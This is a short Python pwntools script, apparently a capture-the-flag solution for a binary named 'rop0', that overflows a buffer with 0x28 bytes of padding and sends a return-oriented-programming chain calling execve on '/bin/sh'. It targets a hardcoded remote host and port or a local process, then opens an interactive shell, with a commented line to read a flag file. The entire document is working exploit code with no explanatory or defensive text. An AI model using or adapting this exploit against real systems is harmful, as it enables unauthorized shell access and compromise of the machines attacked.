#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './rop0'
LIBC = ''
HOST = '140.110.112.77'
PORT = 3121 

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )


pop_rdi_ret = 0x0000000000401516
pop_rdx_rsi_ret = 0x0000000000442909
mov_rax_rdi_ret = 0x0000000000416930
syscall = 0x00000000004003da
binsh = 0x6CCD60
ROP = flat(
    pop_rdi_ret,
    0x3b,
    mov_rax_rdi_ret,
    pop_rdi_ret,
    binsh,
    pop_rdx_rsi_ret,
    0,
    0,
    syscall
)

input()
r.send(b'/bin/sh\x00')
r.sendafter('input_size = ', b'A'*0x28 + ROP)
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
